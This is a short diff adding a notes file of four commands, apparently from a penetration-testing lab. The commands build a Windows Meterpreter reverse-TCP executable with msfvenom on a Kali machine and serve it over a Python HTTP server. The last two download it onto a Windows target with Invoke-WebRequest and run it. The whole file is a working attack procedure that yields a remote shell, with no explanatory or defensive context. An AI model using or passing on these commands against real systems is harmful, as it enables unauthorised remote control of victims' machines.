@@ -1,0 +1,8 @@
+Commands: 
+1. Generate Windows payload on Kali:
+   msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Kali_IP> LPORT=5555 -f exe > shell.exe
+2. Host the payload on Kali:
+    python3 -m http.server 8080
+3. Download & execute on Windows:
+    Invoke-WebRequest -Uri http://<Kali_IP>:8080/shell.exe -OutFile shell.exe
+4. .\shell.exe
